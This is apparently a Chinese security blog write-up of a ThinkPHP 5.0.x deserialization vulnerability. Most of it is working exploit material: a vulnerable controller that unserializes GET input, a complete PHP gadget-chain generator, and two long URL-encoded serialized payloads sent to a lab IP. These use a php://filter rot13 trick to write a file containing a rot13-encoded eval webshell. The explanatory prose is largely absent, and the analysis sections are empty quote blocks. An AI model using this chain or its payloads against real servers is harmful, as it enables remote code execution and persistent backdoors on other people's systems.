# 原创
：  ThinkPHP5.0.x 反序列化

# ThinkPHP5.0.x 反序列化

#### ThinkPHP5.0.x 反序列化

## 漏洞环境

> 



```
&lt;?php
namespace app\index\controller;

class Index
{
    public function index()
    {
	    $Gyan = unserialize($_GET['d1no']);
    	var_dump($Gyan);
      return '&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style="font-size:30px"&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style="font-size:22px;"&gt;[ V5.0 版本由 &lt;a href="http://www.qiniu.com" target="qiniu"&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="ad_bd568ce7058a1091"&gt;&lt;/think&gt;';
    }
}

```

## 漏洞分析

> 



> 



> 



> 



> 



> 



```
$this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)

```

> 



> 



> 



> 



> 



> 



> 



> 



```
php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?&gt;

```

> 



## EXP

> 



```
&lt;?php
namespace think\process\pipes;
use think\model\Pivot;
class Pipes{

}

class Windows extends Pipes{
    private $files = [];

    function __construct(){
        $this-&gt;files = [new Pivot()];
    }
}

namespace think\model;#Relation
use think\db\Query;
abstract class Relation{
    protected $selfRelation;
    protected $query;
    function __construct(){
        $this-&gt;selfRelation = false;
        $this-&gt;query = new Query();#class Query
    }
}

namespace think\model\relation;#OneToOne HasOne
use think\model\Relation;
abstract class OneToOne extends Relation{
    function __construct(){
        parent::__construct();
    }

}
class HasOne extends OneToOne{
    protected $bindAttr = [];
    function __construct(){
        parent::__construct();
        $this-&gt;bindAttr = ["no","123"];
    }
}

namespace think\console;#Output
use think\session\driver\Memcached;
class Output{
    private $handle = null;
    protected $styles = [];
    function __construct(){
        $this-&gt;handle = new Memcached();//目的调用其write()
        $this-&gt;styles = ['getAttr'];
    }
}

namespace think;#Model
use think\model\relation\HasOne;
use think\console\Output;
use think\db\Query;
abstract class Model{
    protected $append = [];
    protected $error;
    public $parent;#修改处
    protected $selfRelation;
    protected $query;
    protected $aaaaa;

    function __construct(){
        $this-&gt;parent = new Output();#Output对象,目的是调用__call()
        $this-&gt;append = ['getError'];
        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()
        $this-&gt;selfRelation = false;//isSelfRelation()
        $this-&gt;query = new Query();

    }
}

namespace think\db;#Query
use think\console\Output;
class Query{
    protected $model;
    function __construct(){
        $this-&gt;model = new Output();
    }
}

namespace think\session\driver;#Memcached
use think\cache\driver\File;
class Memcached{
    protected $handler = null;
    function __construct(){
        $this-&gt;handler = new File();//目的调用File-&gt;set()
    }
}
namespace think\cache\driver;#File
class File{
    protected $options = [];
    protected $tag;
    function __construct(){
        $this-&gt;options = [
        'expire'        =&gt; 0,
        'cache_subdir'  =&gt; false,
        'prefix'        =&gt; '',
        'path'          =&gt; 'php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[q1ab])?&gt;',
        'data_compress' =&gt; false,
        ];
        $this-&gt;tag = true;
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model{


}
use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));

```

> 



```
md5('tag_'.md5($this-&gt;tag))
即:
md5('tag_c4ca4238a0b923820dcc509a6f75849b')
=&gt;3b58a9545013e88c7186db11bb158c44
=&gt;
&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt; + 3b58a9545013e88c7186db11bb158c44
最终文件名：
&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;3b58a9545013e88c7186db11bb158c44.php

```

> 



```
&lt;?php
namespace think\process\pipes;
use think\model\Pivot;
class Pipes{

}

class Windows extends Pipes{
    private $files = [];

    function __construct(){
        $this-&gt;files = [new Pivot()];
    }
}

namespace think\model;#Relation
use think\db\Query;
abstract class Relation{
    protected $selfRelation;
    protected $query;
    function __construct(){
        $this-&gt;selfRelation = false;
        $this-&gt;query = new Query();#class Query
    }
}

namespace think\model\relation;#OneToOne HasOne
use think\model\Relation;
abstract class OneToOne extends Relation{
    function __construct(){
        parent::__construct();
    }

}
class HasOne extends OneToOne{
    protected $bindAttr = [];
    function __construct(){
        parent::__construct();
        $this-&gt;bindAttr = ["no","123"];
    }
}

namespace think\console;#Output
use think\session\driver\Memcached;
class Output{
    private $handle = null;
    protected $styles = [];
    function __construct(){
        $this-&gt;handle = new Memcached();//目的调用其write()
        $this-&gt;styles = ['getAttr'];
    }
}

namespace think;#Model
use think\model\relation\HasOne;
use think\console\Output;
use think\db\Query;
abstract class Model{
    protected $append = [];
    protected $error;
    public $parent;#修改处
    protected $selfRelation;
    protected $query;
    protected $aaaaa;

    function __construct(){
        $this-&gt;parent = new Output();#Output对象,目的是调用__call()
        $this-&gt;append = ['getError'];
        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()
        $this-&gt;selfRelation = false;//isSelfRelation()
        $this-&gt;query = new Query();

    }
}

namespace think\db;#Query
use think\console\Output;
class Query{
    protected $model;
    function __construct(){
        $this-&gt;model = new Output();
    }
}

namespace think\session\driver;#Memcached
use think\cache\driver\File;
class Memcached{
    protected $handler = null;
    function __construct(){
        $this-&gt;handler = new File();//目的调用File-&gt;set()
    }
}
namespace think\cache\driver;#File
class File{
    protected $options = [];
    protected $tag;
    function __construct(){
        $this-&gt;options = [
        'expire'        =&gt; 0,
        'cache_subdir'  =&gt; false,
        'prefix'        =&gt; '',
        'path'          =&gt; './demo/',
        'data_compress' =&gt; false,
        ];
        $this-&gt;tag = true;
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model{


}
use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));

```

## 漏洞复现

> 



```
[payload=](http://192.168.246.129/public/index.php?d1no=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A6%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22no%22%3Bi%3A1%3Bs%3A3%3A%22123%22%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00aaaaa%22%3BN%3B%7D%7D%7D)

```

> 



```
[payload](http://192.168.246.129/public/index.php?d1no=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A6%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22no%22%3Bi%3A1%3Bs%3A3%3A%22123%22%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00aaaaa%22%3BN%3B%7D%7D%7D)

```
